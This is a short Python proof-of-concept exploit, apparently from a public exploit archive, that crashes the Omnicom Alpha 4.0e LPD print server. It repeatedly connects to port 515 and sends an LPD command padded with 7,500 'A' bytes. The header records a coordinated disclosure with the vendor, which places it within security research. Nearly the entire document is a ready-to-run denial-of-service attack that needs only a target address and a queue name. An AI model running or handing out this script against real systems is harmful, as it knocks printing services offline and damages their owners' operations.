#!/usr/bin/python
#Title: Omnicom Alpha 4.0e LPD Server DoS
#Author: Craig Freyman (@cd1zz)
#Software Download: http://www.omnicomtech.com/download/bin/lpd.exe
#Tested on: Windows XP SP3 (English), Server 2003 SP2 (English)
#Dates: Bug Found 7/27/2011, Vendor Notified 8/1/2011, Vendor Responded 8/2/2011, Vendor approved release 8/3/2011
#Notes: For this exploit to work, you must know the name of a printer queue on the server. 

import socket,sys,time

if len(sys.argv) < 3:
	print "[-]Usage: %s <target addr> <queue name>" % sys.argv[0]
	sys.exit(0)

target = sys.argv[1]
queue = sys.argv[2]

counter = 1
crash = "\x41" * 7500

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

try:
	while counter<=50:
		print "[*] Left jab "+str(counter)+" times."
		s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s.connect((target,515))
		s.send("\x02"+queue+" "+crash+"LF")
		time.sleep(.25)
		counter+=1
except:
    	print "[-] "+target+" has been knocked out with a right hook!"
    	sys.exit(0)


